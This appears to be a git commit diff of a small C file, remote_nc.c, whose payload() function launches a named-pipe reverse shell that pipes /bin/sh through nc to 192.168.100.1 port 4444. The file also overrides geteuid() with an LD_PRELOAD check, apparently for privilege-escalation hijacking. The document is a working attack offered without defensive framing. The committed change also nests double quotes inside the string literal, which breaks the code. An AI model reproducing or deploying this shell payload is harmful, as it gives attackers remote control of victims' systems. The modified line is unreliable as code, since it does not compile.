dd98a9fec6aea7ec42d0267124d4f485d32f73fe
Anggrdwjy <anggarda.wijaya410@gmail.com>
2025-01-11 20:53:51 +0700

    Update and rename remote.c to remote_nc.c

--- asset/remote_nc.c
+++ asset/remote_nc.c
@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <string.h>
 void payload() {
-system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.1 4444 >/tmp/f");
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "192.168.100.1 4444" >/tmp/f");
 }
 int geteuid() {
 if (getenv("LD_PRELOAD") == NULL) { return 0; }
